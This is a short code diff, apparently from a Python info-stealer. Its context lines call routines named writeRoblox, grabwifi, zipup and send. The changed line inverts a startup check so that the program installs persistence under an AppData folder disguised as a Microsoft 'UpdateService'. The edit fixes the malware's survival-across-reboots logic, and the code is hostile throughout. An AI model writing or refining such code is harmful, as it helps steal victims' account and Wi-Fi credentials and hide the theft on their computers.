@@ -63,7 +63,7 @@ class main():
 		self.writeRoblox()
 		self.grabwifi()
 
-		if config["Startup"] and sys.argv[0] == fr"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\UpdateService\{self.filename}": self.startup()
+		if config["Startup"] and not sys.argv[0] == fr"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\UpdateService\{self.filename}": self.startup()
 
 		self.zipup()
 		self.send()
